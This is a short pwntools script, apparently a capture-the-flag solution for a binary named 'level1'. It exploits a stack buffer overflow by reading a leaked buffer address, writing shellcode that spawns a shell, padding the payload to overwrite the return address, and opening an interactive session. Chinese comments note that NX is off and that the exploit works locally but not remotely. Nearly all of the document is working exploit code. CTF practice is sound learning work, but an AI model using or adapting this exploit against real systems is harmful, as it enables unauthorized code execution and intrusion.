from pwn import *

# 本地能打通，远程不行
r = process(r'./level1')
# r = remote(r'node5.buuoj.cn', 25656)

context.arch = 'i386'
context.log_level = 'debug'

r.recvuntil(b'this:')
buf_addr = int(r.recvuntil(b'?\n', drop=True), 16)
print(hex(buf_addr))

# 没开启nx保护，并且输出了buf的地址；直接写shellcode到buf并跳转到buf上
shellcode = asm(shellcraft.sh())
# payload = shellcode + b'A' * (0x88 - len(shellcode) + 4) + p32(buf_addr)
payload = shellcode.ljust(0x88 + 4, b'\x00') + p32(buf_addr)
r.sendline(payload)
r.interactive()
